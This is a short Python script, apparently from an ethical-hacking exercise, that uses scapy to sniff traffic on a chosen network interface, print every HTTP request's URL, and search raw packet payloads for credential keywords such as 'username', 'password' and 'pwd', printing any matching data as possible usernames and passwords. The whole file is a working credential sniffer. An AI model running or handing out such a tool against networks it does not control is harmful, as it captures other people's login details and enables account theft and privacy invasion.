#!/usr/bin/python
#kamene is scapy just an FYI

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "usr", "user", "login", "log", "password", "pass", "pwd", "paaswd", "Password", "LoginUsername", "Username", "User", "Pwd"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST >> "+url+"\n")
        loging_info = get_login_info(packet)
        if loging_info:
            print("\n\n[+] Possible username & passowrd >> " + loging_info + "\n\n")


if __name__ == "__main__":
    interface = raw_input("[+] Interface to use ==> ")
    sniff(str(interface))
